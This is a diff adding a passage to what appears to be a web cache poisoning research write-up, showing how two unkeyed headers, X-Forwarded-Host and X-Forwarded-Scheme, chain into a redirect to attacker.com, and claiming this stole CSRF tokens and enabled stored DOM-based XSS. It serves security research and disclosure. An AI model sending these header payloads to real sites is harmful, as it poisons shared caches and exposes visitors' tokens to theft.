@@ -276,3 +276,41 @@ HTTP/1.1 200 OK
 ``````
 
 Cloudflare happily cached this response and served it to subsequent visitors. 
+
+### Chaining Unkeyed Inputs
+
+ Sometimes an unkeyed input will only confuse part of the application stack, and you'll need to chain in other unkeyed inputs to achieve an  exploitable result. Take the following site:
+
+```http
+GET /en HTTP/1.1
+Host: redacted.net
+X-Forwarded-Host: xyz
+
+HTTP/1.1 200 OK
+Set-Cookie: locale=en; domain=xyz
+```
+
+ The X-Forwarded-Host header overrides the domain on the cookie, but  none of the URLs generated in the rest of the response. By itself this  is useless. However, there's another unkeyed input: 
+
+```http
+GET /en HTTP/1.1
+Host: redacted.net
+X-Forwarded-Scheme: nothttps
+
+HTTP/1.1 301 Moved Permanently
+Location: https://redacted.net/en
+```
+
+This input is also useless by itself, but if we combine the two together we  can convert the response into a redirect to an arbitrary domain:
+
+```http
+GET /en HTTP/1.1
+Host: redacted.net
+X-Forwarded-Host: attacker.com
+X-Forwarded-Scheme: nothttps
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker.com/en 
+```
+
+ Using this technique it was possible to steal [CSRF](https://portswigger.net/web-security/csrf) tokens from a custom HTTP header by redirecting a POST request. I could also obtain stored [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) with a malicious response to a JSON load, similar to the data.gov exploit mentioned earlier. 
